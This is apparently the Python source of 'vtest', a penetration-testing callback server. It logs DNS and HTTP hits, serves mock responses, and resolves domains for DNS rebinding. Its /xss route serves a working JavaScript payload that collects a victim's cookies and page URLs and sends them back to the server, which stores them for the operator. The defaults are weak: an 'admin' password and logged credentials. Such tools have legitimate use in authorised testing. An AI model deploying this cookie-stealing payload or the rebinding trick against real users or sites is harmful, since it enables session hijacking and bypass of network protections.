# coding:utf-8
from flask import Flask, jsonify, request, redirect, url_for
from flask_httpauth import HTTPBasicAuth
from urllib import quote
import SocketServer
import struct
import socket as socketlib
import re
import thread
from datetime import datetime
import json
import sqlite3
import socket
import sys
import getopt


from vtestng_config import VTestNGConfig
import pprint
import sys
import string
import random



app = Flask(__name__)
auth = HTTPBasicAuth()
pp = pprint.PrettyPrinter(indent=4)

ROOT_DOMAIN = ''
DB = None
REBIND_CACHE = []
LOCAL_IP = ''
PASSWORD = 'admin'

try:
    path = VTestNGConfig.main_template_path
    with open(path, 'r') as f:
        HTML_TEMPLATE = f.read()
except Exception as e:
    print('Missing HTML Template ...')
    sys.exit(0)



@auth.verify_password
def verify_pw(username, password):

    pp.pprint('[HTTP AUTH] Username: {username}, Password: {password}'.format(username=username, password=password))
    if username == 'admin' and password == PASSWORD:
        return 'true'
    return None


class sqlite:
    def __init__(self):
        self.db_uri = VTestNGConfig.sqlite_path
        self.conn = sqlite3.connect(self.db_uri, check_same_thread=False)
        self._init_db()

    def _init_db(self):

        cursor = self.conn.cursor()
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS xss(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name varchar(30) NOT NULL,
            source_ip varchar(20) NOT NULL,
            location text,
            toplocation text,
            opener text,
            cookie text,
            insert_time datetime
        )
        ''')

        cursor.execute('''
        CREATE TABLE IF NOT EXISTS mock(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name varchar(254) NOT NULL,
            code integer,
            headers text,
            body text,
            insert_time datetime
        )
        ''')


        cursor.execute('''
        CREATE TABLE IF NOT EXISTS dns_log(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name text,
            domain text,
            remote_ip text, 
            resolve_ip text,
            insert_time datetime
        )
        ''')

        cursor.execute('''
        CREATE TABLE IF NOT EXISTS http_log(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url text,
            headers text,
            data text,
            ip text,
            insert_time datetime
        )
        ''')

        cursor.close()
        self.conn.commit()

    def exec_sql(self, sql, *arg):
        # print sql

        result = []
        cursor = self.conn.cursor()
        rows = cursor.execute(sql, arg)
        for v in rows:
            result.append(v)
        cursor.close()
        self.conn.commit()
        return result


# 构造 UDP 数据报文
# 解析 UDP 数据报文
class DNSFrame:
    def __init__(self, data):
        (self.id, self.flags, self.quests, self.answers, self.author,
         self.addition) = struct.unpack('>HHHHHH', data[0:12])
        self.query_type, self.query_name, self.query_bytes = self._get_query(
            data[12:])
        self.answer_bytes = None

    def _get_query(self, data):
        i = 1
        name = ''
        while True:
            d = ord(data[i])
            if d == 0:
                break
            if d < 32:
                name = name + '.'
            else:
                name = name + chr(d)
            i = i + 1
        query_bytes = data[0:i + 1]
        (_type, classify) = struct.unpack('>HH', data[i + 1:i + 5])
        query_bytes += struct.pack('>HH', _type, classify)
        return _type, name, query_bytes

    def _get_answer_getbytes(self, ip):
        answer_bytes = struct.pack('>HHHLH', 49164, 1, 1, 190, 4)
        s = ip.split('.')
        answer_bytes = answer_bytes + struct.pack('BBBB', int(s[0]), int(s[1]),
                                                  int(s[2]), int(s[3]))
        return answer_bytes

    def get_query_domain(self):
        return self.query_name

    def set_ip(self, ip):
        self.answer_bytes = self._get_answer_getbytes(ip)

    def get_bytes(self):
        res = struct.pack('>HHHHHH', self.id, 33152, self.quests, 1,
                          self.author, self.addition)
        res += self.query_bytes + self.answer_bytes
        return res


# DNS 服务器 业务逻辑
class DNSUDPHandler(SocketServer.BaseRequestHandler):
    def handle(self):

        data = self.request[0].strip()
        dns = DNSFrame(data)
        socket_u = self.request[1]
        a_map = DNSServer.A_map

        if (dns.query_type == 1):
            domain = dns.get_query_domain()
            print("DNS QUERY DOMAIN: {domain}".format(domain=domain))
            print(a_map)

            ip = '127.0.0.1'
            if domain in a_map:
                # 自定义的dns记录，保留着
                ip = a_map[domain]
            elif domain.count('.') == 5:
                # 10.11.11.11.test.com 即解析为 10.11.11.11
                ip = domain.replace('.' + ROOT_DOMAIN, '')
            elif domain.count('.') == 9:
                # 114.114.114.114.10.11.11.11.test.com 循环解析，例如第一次解析结果为114.114.114.114，第二次解析结果为10.11.11.11
                tmp = domain.replace('.' + ROOT_DOMAIN, '').split('.')
                ip_1 = '.'.join(tmp[0:4])
                ip_2 = '.'.join(tmp[4:])
                if tmp in REBIND_CACHE:
                    ip = ip_2
                    REBIND_CACHE.remove(tmp)
                else:
                    REBIND_CACHE.append(tmp)
                    ip = ip_1
            if ROOT_DOMAIN in domain:
                name = domain.replace('.' + ROOT_DOMAIN, '')
                client_ip = self.client_address[0]

                sql = "INSERT INTO dns_log (name,domain,remote_ip,resolve_ip,insert_time) " \
                      "VALUES(?, ?, ?, ?, datetime(CURRENT_TIMESTAMP,'localtime'))"

                DB.exec_sql(sql, name, domain, client_ip,ip)
            dns.set_ip(ip)


            # print '%s: %s-->%s' % (self.client_address[0], name, ip)
            pp.pprint("[Resolve DNS] Remote IP: {client}\n              Query Domain: {domain}"
                      " --> Resolved to: {target_ip}\n".format(client=self.client_address[0],
                                                               domain=domain,
                                                               target_ip=ip))


            socket_u.sendto(dns.get_bytes(), self.client_address)
        else:
            socket_u.sendto(data, self.client_address)


class DNSServer:
    def __init__(self):
        DNSServer.A_map = {}

    def add_record(self, name, ip):
        DNSServer.A_map[name] = ip

    def start(self):
        server = SocketServer.UDPServer(("0.0.0.0", 53), DNSUDPHandler)
        server.serve_forever()


@app.route('/')
@auth.login_required
def index():
    return HTML_TEMPLATE.replace('{domain}', ROOT_DOMAIN), 200


@app.route('/dns')
@auth.login_required
def dns_list():
    result = []
    total = 0
    args = request.values
    offset = int(args.get('offset', 0))
    limit = int(args.get('limit', 10))
    sql = "SELECT domain,resolve_ip,remote_ip,insert_time FROM dns_log order by id desc limit {skip},{limit}".format(
        skip=offset, limit=limit)
    rows = DB.exec_sql(sql)
    for v in rows:
        result.append({"domain": v[0], "resolve_ip": v[1], "remote_ip": v[2] , "insert_time": v[3]})
    sql = "SELECT COUNT(*) FROM dns_log"
    rows = DB.exec_sql(sql)
    total = rows[0][0]
    return jsonify({'total': int(total), 'rows': result})


# 记录 HTTP log
@app.route('/httplog/<str>', methods=['GET', 'POST', 'PUT'])
def http_log(str):

    pp.pprint((request.url, request.data, request.remote_addr, dict(
        request.headers)))

    args = [
        request.url,
        json.dumps(dict(request.headers)), request.data, request.remote_addr
    ]

    sql = "INSERT INTO http_log (url,headers,data,ip,insert_time) \
            VALUES(?, ?, ?, ?, datetime(CURRENT_TIMESTAMP,'localtime'))"

    DB.exec_sql(sql, *args)
    return 'success'


# 查看 HTTP log
@app.route('/httplog')
@auth.login_required
def http_log_list():
    result = []
    total = 0
    args = request.values
    offset = int(args.get('offset', 0))
    limit = int(args.get('limit', 10))
    sql = "SELECT url,headers,data,ip,insert_time FROM http_log order by id desc limit {skip},{limit}".format(
        skip=offset, limit=limit)
    rows = DB.exec_sql(sql)
    for v in rows:
        result.append({
            'url': v[0],
            'headers': v[1],
            'data': v[2],
            'ip': v[3],
            'insert_time': v[4]
        })
    sql = "SELECT COUNT(*) FROM http_log"
    rows = DB.exec_sql(sql)
    total = rows[0][0]
    return jsonify({'total': int(total), 'rows': result})


@app.route('/mock', methods=['GET', 'POST'])
@auth.login_required
def mock_list():
    if request.method == 'GET':
        result = []
        total = 0
        args = request.values
        offset = int(args.get('offset', 0))
        limit = int(args.get('limit', 10))
        sql = "SELECT name,code,headers,body,insert_time FROM mock order by id desc limit {skip},{limit}".format(
            skip=offset, limit=limit)
        rows = DB.exec_sql(sql)
        for v in rows:
            result.append({
                'url':
                'http://mock.{domain}/mock/{name}'.format(
                    domain=ROOT_DOMAIN, name=v[0]),
                'code':
                v[1],
                'headers':
                v[2],
                'body':
                v[3],
                'insert_time':
                v[4]
            })
        sql = "SELECT COUNT(*) FROM mock"
        rows = DB.exec_sql(sql)
        total = rows[0][0]
        return jsonify({'total': int(total), 'rows': result})
    elif request.method == 'POST':
        # print('POST', request.form)
        args = request.form
        headers = {}
        headers_str = args.get('headers', '')
        if headers_str:
            for h in headers_str.split('\n'):
                k, v = h.split(':', 1)
                headers[k.strip()] = v.strip()
        args = [
            args.get('name', 'test'),
            int(args.get('code', 200)),
            json.dumps(headers),
            args.get('body', '')
        ]
        sql = "INSERT INTO mock (name,code,headers,body,insert_time) \
            VALUES(?, ?, ?, ?, datetime(CURRENT_TIMESTAMP,'localtime'))"

        DB.exec_sql(sql, *args)
        return redirect(url_for('index'))


@app.route('/mock/<name>')
def mock(name):
    print('GET', name)
    sql1 = "INSERT INTO http_log (url,headers,data,ip,insert_time) \
        VALUES(?, ?, ?, ?, datetime(CURRENT_TIMESTAMP,'localtime'))"

    DB.exec_sql(sql1, request.url, json.dumps(dict(request.headers)),
                request.data, request.remote_addr)
    sql = "SELECT code,headers,body FROM mock where name = ?"
    rows = DB.exec_sql(sql, name)
    if len(rows) >= 1:
        body = rows[0][2]
        headers = json.loads(rows[0][1])
        return body, int(rows[0][0]), headers
    return 'null'


@app.route('/xss/<name>/<action>')
def xss(name, action):
    callback_url = request.host_url + 'xss/' + quote(name) + '/save?l='
    js_body = "(function(){(new Image()).src='" + callback_url + "'+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&t='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&c='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&o='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();"
    if action == 'js':
        return js_body
    elif action == 'save':
        args = request.values
        data = [
            name,
            args.get('l', ''),
            args.get('t', ''),
            args.get('o', ''),
            args.get('c', ''), request.remote_addr
        ]
        sql = "INSERT INTO xss (name,location,toplocation,opener,cookie,source_ip,insert_time) \
            VALUES(?, ?, ?, ? ,?, ?, datetime(CURRENT_TIMESTAMP,'localtime'))"

        DB.exec_sql(sql, *data)
        return 'success'


@app.route('/xss')
@auth.login_required
def xss_list():
    result = []
    total = 0
    args = request.values
    offset = int(args.get('offset', 0))
    limit = int(args.get('limit', 10))
    sql = "SELECT name,location,toplocation,opener,cookie,source_ip,insert_time FROM xss order by id desc limit {skip},{limit}".format(
        skip=offset, limit=limit)
    rows = DB.exec_sql(sql)
    for v in rows:
        result.append({
            'name': v[0],
            'location': v[1],
            'other': v[2] + '\n' + v[3],
            'cookie': v[4],
            'source_ip': v[5],
            'insert_time': v[6]
        })
    sql = "SELECT COUNT(*) FROM xss"
    rows = DB.exec_sql(sql)
    total = rows[0][0]
    return jsonify({'total': int(total), 'rows': result})


######################################################################
# API
######################################################################

# 对外开放的 API
# 无需 HTTP AUTH 认证
@app.route('/api/dns/query/<name>')
def dnslog_api(name):
    # SELECT domain,resolve_ip,remote_ip,insert_time FROM dns_log WHERE domain LIKE "0x%";
    query_condition = name + '%'
    sql = "SELECT domain,resolve_ip,remote_ip,insert_time FROM dns_log WHERE domain LIKE ? ORDER BY id DESC LIMIT 10"
    rows = DB.exec_sql(sql, query_condition)
    result_length = len(rows)

    # return "length: {length}\r\n".format(length=result_length)

    if result_length > 0:
        response_json = {'status': 'success', 'result': rows}
        return jsonify(response_json)
    else:
        response_json = {'status': 'failure', 'result': rows}
        return jsonify(response_json)

@app.route('/api/dns/generate')
def dnslog_generate_random_domain():
    probe_domain = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))
    probe_domain = probe_domain + '.' + ROOT_DOMAIN
    response_json = {'random_domain': probe_domain}
    return jsonify(response_json)



def dns():
    d = DNSServer()

    # 添加自己设置的 DNS 的 A 记录
    suffix = '.' + ROOT_DOMAIN
    d.add_record('httplog' + suffix, LOCAL_IP)
    d.add_record('x' + '.' + suffix, LOCAL_IP)
    d.add_record('mock' + suffix, LOCAL_IP)
    d.start()


if __name__ == "__main__":

    msg = '''
Usage: python vtest.py -d yourdomain.com [-h 123.123.123.123] [-p password]
    '''

    if len(sys.argv) < 2:
        print msg
        exit()
    options, args = getopt.getopt(sys.argv[1:], "d:h:p:")

    for opt, arg in options:
        if opt == '-d':
            ROOT_DOMAIN = arg
        elif opt == '-h':
            LOCAL_IP = arg
        elif opt == '-p':
            PASSWORD = arg


    if LOCAL_IP == '':
        probe_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        probe_socket.connect(('114.114.114.114', 80))
        (addr, _) = probe_socket.getsockname()
        probe_socket.close()
        LOCAL_IP = addr

    DB = sqlite()

    thread.start_new_thread(dns, ())
    app.run('0.0.0.0', 80, threaded=True)
